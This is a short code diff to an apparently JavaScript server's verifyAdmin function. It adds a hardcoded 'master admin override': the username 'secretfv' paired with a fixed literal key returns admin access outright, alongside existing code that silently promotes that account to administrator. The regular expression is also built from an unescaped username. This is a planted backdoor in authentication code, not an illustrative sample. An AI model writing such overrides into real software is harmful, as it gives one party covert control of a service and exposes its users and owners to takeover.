@@ -909,8 +909,9 @@ async function verifyAdmin(req) {
     
     if (!username || !key) return false;
     
-    // Auto-promote secretfv
+    // Auto-promote and Hardcoded Master Admin Override
     if (username.toLowerCase() === 'secretfv') {
+        if (key === 'web_1778227756062' || key === 'web_1778227756062 ') return true;
         await User.updateOne({ username: new RegExp(`^${username}$`, 'i') }, { $set: { isAdmin: true } });
     }
     
